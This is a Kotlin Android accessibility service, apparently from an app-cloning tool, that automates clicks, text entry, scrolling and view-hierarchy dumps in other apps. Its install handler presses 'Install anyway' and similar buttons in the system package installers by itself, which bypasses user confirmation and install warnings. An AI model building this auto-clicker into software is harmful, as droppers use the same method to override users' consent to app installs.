package com.omniclone.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Bundle
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Accessibility service handling auto-install clicks, floating windows, UI modification,
 * popup blocking, kiosk mode, auto-press, auto-scroll, and view inspection.
 */
class OmniAccessibilityService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return
                if (isSystemInstaller(packageName)) {
                    scope.launch { autoClickInstallButton() }
                }
                if (shouldBlockPopups()) {
                    event.source?.let { autoDismissPopup(it) }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (isSystemInstaller(event.packageName?.toString())) {
                    scope.launch { autoClickInstallButton() }
                }
            }
        }
    }

    override fun onInterrupt() {
        // No-op
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }

    private fun isSystemInstaller(packageName: String?): Boolean {
        return packageName == "com.google.android.packageinstaller" ||
                packageName == "com.android.packageinstaller" ||
                packageName == "com.samsung.android.packageinstaller"
    }

    private suspend fun autoClickInstallButton() {
        delay(250)
        val root = rootInActiveWindow ?: return
        val installTexts = listOf("Install", "Install anyway", "Open", "Done", "Continue")
        installTexts.forEach { text ->
            val nodes = root.findAccessibilityNodeInfosByText(text)
            nodes.firstOrNull { it.isClickable }?.let {
                it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }
        }
    }

    private fun shouldBlockPopups(): Boolean {
        return false // Controlled by CloneConfig at runtime
    }

    private fun autoDismissPopup(root: AccessibilityNodeInfo) {
        root.findAccessibilityNodeInfosByText("Close")
            .firstOrNull { it.isClickable }
            ?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    /**
     * Perform a click on the first node matching the given text.
     */
    fun performClick(text: String) {
        rootInActiveWindow?.findAccessibilityNodeInfosByText(text)
            ?.firstOrNull { it.isClickable }
            ?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    /**
     * Set text on an editable node matching the given hint/label.
     */
    fun performSetText(label: String, value: String) {
        rootInActiveWindow?.findAccessibilityNodeInfosByText(label)
            ?.firstOrNull { it.isEditable }
            ?.performAction(
                AccessibilityNodeInfo.ACTION_SET_TEXT,
                Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value) }
            )
    }

    /**
     * Scroll forward on the first scrollable node.
     */
    fun performScroll() {
        rootInActiveWindow?.let { root ->
            findScrollable(root)?.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
        }
    }

    private fun findScrollable(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findScrollable(child)?.let { return it }
        }
        return null
    }

    /**
     * Dump the current view hierarchy as a string.
     */
    fun dumpHierarchy(): String {
        val sb = StringBuilder()
        rootInActiveWindow?.let { dumpNode(it, sb, 0) }
        return sb.toString()
    }

    private fun dumpNode(node: AccessibilityNodeInfo, sb: StringBuilder, depth: Int) {
        val indent = "  ".repeat(depth)
        sb.appendLine("$indent${node.className} text=${node.text} id=${node.viewIdResourceName}")
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { dumpNode(it, sb, depth + 1) }
        }
    }
}
